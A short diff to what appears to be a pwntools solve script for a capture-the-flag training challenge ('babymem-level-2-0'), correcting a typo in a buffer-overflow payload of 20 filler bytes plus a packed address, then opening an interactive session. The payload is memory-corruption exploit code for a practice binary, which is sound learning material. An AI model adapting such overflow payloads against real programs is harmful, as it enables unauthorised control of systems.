@@ -19,7 +19,7 @@ p = process('/challenge/babymem-level-2-0')
 
 p.sendline(b"100")
 
-payload = b"A" * 2:0 + b"\x2b\x04\x74\x40"
+payload = b"A" * 20 + b"\x2b\x04\x74\x40"
 p.sendline(payload)
 
 p.interactive()
